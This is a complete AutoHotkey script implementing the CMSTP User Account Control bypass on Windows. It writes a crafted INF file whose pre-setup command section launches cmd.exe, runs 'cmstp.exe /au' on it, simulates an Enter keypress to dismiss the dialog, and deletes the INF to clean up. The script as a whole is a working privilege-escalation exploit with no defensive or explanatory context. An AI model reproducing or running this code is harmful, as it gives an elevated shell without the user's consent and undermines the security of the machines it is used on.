#Requires AutoHotkey v2.0
#SingleInstance Force

; Use temp directory instead of Windows directory
infPath := A_Temp "\cmstp.ini"

; INF file contents with explicit Windows line endings
infContents := StrReplace("
(
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
 
[RunPreSetupCommandsSection]
cmd.exe
taskkill /IM cmstp.exe /F
 
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
 
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
[Strings]
ServiceName="bypassit"
ShortSvcName="bypassit"
)", "`n", "`r`n")

try {
    ; Write the INF file
    FileAppend(infContents, infPath)
    
    ; Run CMSTP with properly quoted path
    Run('cmstp.exe /au "' infPath '"', A_WorkingDir, "Max")
    
    ; Match original timing for dialog interaction
    Sleep(2000)
    Send("{Enter}")
    
    ; Allow sufficient time for CMSTP processing
    Sleep(5000)
    
    ; Clean up
    FileDelete(infPath)
} catch as err {
    MsgBox("Error: " err.Message)
}

ExitApp